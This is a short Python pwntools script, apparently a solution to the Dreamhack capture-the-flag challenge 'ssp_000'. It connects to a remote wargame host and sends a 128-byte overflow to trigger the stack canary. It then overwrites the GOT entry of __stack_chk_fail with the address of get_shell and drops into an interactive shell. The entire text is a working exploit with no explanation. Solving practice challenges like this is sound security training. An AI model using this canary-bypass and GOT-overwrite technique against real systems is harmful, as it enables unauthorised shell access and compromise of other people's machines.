#!/usr/bin/env python3
from pwn import *
exe = ELF('ssp_000', checksec = False)

# p = process(exe.path)
p = remote('host3.dreamhack.games', 9395)

# input()
p.sendline(b'a'*128)
p.sendlineafter(b'Addr : ', str(int(exe.got['__stack_chk_fail'])).encode())
p.sendlineafter(b'Value : ', str(int(exe.sym['get_shell'])).encode())



p.interactive()